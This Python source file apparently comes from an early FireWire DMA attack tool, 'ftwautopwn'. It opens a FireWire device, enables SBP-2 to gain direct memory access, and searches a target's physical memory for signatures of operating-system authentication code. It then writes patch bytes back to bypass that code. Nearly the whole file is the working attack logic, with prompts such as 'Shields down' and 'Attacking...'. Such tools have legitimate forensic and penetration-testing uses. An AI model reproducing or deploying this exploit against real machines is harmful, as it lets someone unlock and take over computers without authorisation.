'''
Created on Jun 23, 2011

@author: carmaa
'''
from binascii import hexlify
from forensic1394 import Bus
from ftwautopwn.util import msg, clean_hex, MemoryFile, fail, findmemsize,\
    bytelen, int2binhex
from time import sleep

import sys
import ftwautopwn.settings as settings


def select_target(targets, selected=False):
    '''
    Provides easy selection of targets. Input is a list of targets (dicts)
    '''
    if not selected: selected = input('Please select target (or enter \'q\' to quit): ')
    nof_targets = len(targets)
    try:
        selected = int(selected)
    except:
        if selected == 'q': sys.exit()
        else:
            msg('!', 'Invalid selection, please try again. Type \'q\' to quit.')
            return select_target(targets)
    if selected <= nof_targets: return targets[selected - 1]
    else:
        msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit.')
        return select_target(targets)

def printdetails(target):
    '''
    Prints details about a target
    '''
    msg('*', 'The attack contains the following signatures:')
    print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
    print('\tArchitectures:\t' + ', '.join(target['architectures']).rstrip(', '))
    for signature in target['signatures']:
        offsets = '\n\t\tOffsets:\t'
        for offset in signature['offsets']:
            offsets += hex(offset)
            if not offset is signature['offsets'][-1]: offsets += ', '
        print(offsets)
        sig = '\t\tSignature:\t0x'
        ioffs = 0
        patch = 0
        poffs = 0
        for chunk in signature['chunks']:
            diff = chunk['internaloffset'] - bytelen(chunk['chunk']) - 1 - ioffs
            for i in range(diff): # TODO: Find a more pythonic way of doing this
                sig += '__'
            ioffs = chunk['internaloffset']
            sig += '{0:x}'.format(chunk['chunk'])
            try:
                patch = chunk['patch']
                poffs = chunk['patchoffset']
            except KeyError: pass
        print(sig)
        print('\t\tPatch:\t\t{0:#x}'.format(patch))
        print('\t\tPatch offset:\t{0:#x}'.format(poffs))
        
    print()

def initfw():
    '''
    Initializes FireWire and waits for SBP-2
    '''
    b = Bus()
    # TODO: Check that we are connected and can see a FW unit directory
    # TODO: Use businfo method here, start timing and reduce the delay below based
    # on how long time the user use to select a device
    # TODO: Drop enabling SBP-2 if target is OS X
    # Enable SBP-2 support to ensure we get DMA
    b.enable_sbp2()
    try:
        for i in range(settings.fw_delay, 0, -1):
            sys.stdout.write('[*] Initializing bus and enabling SBP-2, please wait %2d seconds or press Ctrl+C\r' % i)
            sys.stdout.flush()
            sleep(1)
    except KeyboardInterrupt:
        msg('!', 'Interrupted')
        pass
    # TODO: Make sure that we actually have devices, plus error checking 
    # Open the first device for now
    d = b.devices()[0]
    d.open()
    print() # Create a newline so that next call to print() will start on a new line
    return d

def siglen(l):
    '''
    Accepts dicts with key 'internaloffset', and calculates the length of the 
    total signature in number of bytes
    '''
    index = value = 0
    for i in range(len(l)):
        if l[i]['internaloffset'] > value:
            value = l[i]['internaloffset']
            index = i
    # Must decrement bytelen with one since byte positions start at zero
    return bytelen(l[index]['chunk']) - 1 + value


def match(candidate, chunks):
    '''
    Matches a candidate read from memory with the signature chunks
    '''
    for c in chunks:
        ioffset = c['internaloffset']
        if c['chunk'] != candidate[ioffset:ioffset + len(c['chunk'])]:
            return False
    return True
    

def patch(device, address, chunks):
    '''
    Writes back to the device at address, using the patches in the signature
    chunks
    '''
    success = True
    for c in chunks:
        patch = c['patch']
        if not patch:
            continue
        ioffset = c['internaloffset']
        poffset = c['patchoffset']
        if not poffset: 
            poffset = 0
        realaddress = address + ioffset + poffset
        if patch:
            device.write(realaddress, patch)
            if device.read(realaddress, len(patch)) != patch:
                success = False
    return success
        

def searchanddestroy(device, target, memsize):
    '''
    Main search loop
    '''
    # TODO: Create support for other page sizes (2 GiB for Macs)
    pageaddress = settings.MiB
    signatures = target['signatures']

    # Add signature lengths in bytes to the dictionary, and replace integer
    # representations of the signatures and patches with bytes
    for signature in signatures:
        signature['length'] = siglen(signature['chunks'])
        offsets = signature['offsets'] # Offsets within pages
        for chunk in signature['chunks']:
            chunk['chunk'] = int2binhex(chunk['chunk'])
            try:
                chunk['patch'] = int2binhex(chunk['patch'])
            except KeyError:
                chunk['patch'] = None

    try:
        # Build a batch of read requests of the form: [(addr1, len1), ...] and
        # a corresponding match vector: [(chunks1, patchoffset1), ...]
        j = 0
        count = 0
        cand = b'\x00'
        r = []
        p = []
        while pageaddress < memsize:
            sig_len = len(signatures)
            
            for i in range(sig_len): # Iterate over signatures
                offsets = signatures[i]['offsets'] # Offsets within pages
                if isinstance(offsets, int):
                    offsets = [offsets] # Create a list if single offset
                chunks = signatures[i]['chunks'] # The chunks that is the sig
                length = signatures[i]['length'] # Sig length in bytes
                offset_len = len(offsets)
                
                for n in range(offset_len): # Iterate over offsets
                    address = pageaddress + offsets[n] + settings.PAGESIZE * j
                    r.append((address, length))
                    p.append(chunks)
                    count += 1
                    # If we have built a full vector, read from memory and
                    # compare to the corresponding signatures
                    if count == settings.vectorsize:
                        # Read data from device
                        m = 0
                        for caddr, cand  in device.readv(r):
                            if match(cand, p[m]):
                                print()
                                return (caddr, p[m])
                            m += 1                    
                        # Jump to next pages (we're finished with these)
                        mask = ~(settings.PAGESIZE - 0x01)
                        pageaddress = address & mask
                        if sig_len == i and offset_len == n:
                            pageaddress = pageaddress + settings.PAGESIZE
                        # Zero out counters and vectors
                        j = 0
                        count = 0
                        r = []
                        p = []
                        # Print status
                        mibaddr = pageaddress // settings.MiB
                        sys.stdout.write('[*] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
                        if settings.verbose:
                            sys.stdout.write(' Data read: 0x' + hexlify(cand).decode(settings.encoding))
                        sys.stdout.write('\r')
                        sys.stdout.flush()
                         
            j += 1 # Increase read request count
            
    except IOError:
        print()
        fail('I/O Error, make sure FireWire interfaces are properly '\
                 'connected.')
    
    # If we get here, we haven't found anything :-/
    print()    
    return (None, None)

def attack(targets):
    '''
    Main attack logic
    '''
    # TODO: Detect targets

    # If not detected, list targets
    for number, target in enumerate(targets, 1):
                msg(number, target['OS'] + ': ' + target['name'])
                
    # Select target
    target = select_target(targets)
    
    # Print selection. If verbose, print selection with signatures
    msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
    if settings.verbose:
        #msg('*', 'The attack contains the following signatures:')
        printdetails(target)
        # TODO: Create a pretty print method that can print this in a fashionable way
        #pprint(target['signatures'])
        #print()
        
        
    # Initialize and lower DMA shield
    device = None
    if settings.filemode:
        device = MemoryFile(settings.filename, settings.PAGESIZE)
    else:
        device = initfw()
        
    # TODO: Check that we have DMA (use isStale())
    # Determine memory size and set to default if not found
    memsize = findmemsize(device)
    if not memsize:
        # TODO: Create a select() method that can cope with defaults
        cont = input('[-] Could not determine memory size: DMA shield may still be up. Try increasing the\n'\
                     '    delay after enabling SBP2 (-d switch). Do you want to continue and use the FireWire\n'\
                     '    maximum addressable limit (4 GiB) as memory size? [y/N]:')
        if cont in ['y', 'Y']:
            memsize = settings.memsize
        else:
            fail()
    else:
        msg('*', 'Found memory size: {0:d} MiB. Shields down.'.format(memsize // settings.MiB))
    
    # Perform parallel search for all signatures for each OS at the known offsets
    msg('*', 'Attacking...')
    address, chunks = searchanddestroy(device, target, memsize)
    if not address:
        # TODO: Sequential search
        fail('Could not locate signature(s).')
    
    # Signature found, let's patch
    mask = 0xffff0000 # Mask away the lower bytes to find the page number
    page = int((address & mask) / settings.PAGESIZE)
    msg('+', 'Signature found at {0:#x} (@page # {1}).'.format(address, page))
    if not settings.dry_run:
        success = patch(device, address, chunks)
        if success:
            msg('+', 'Write-back verified; patching successful.')
        else:
            msg('-', 'Write-back could not be verified; patching unsuccessful.')
    
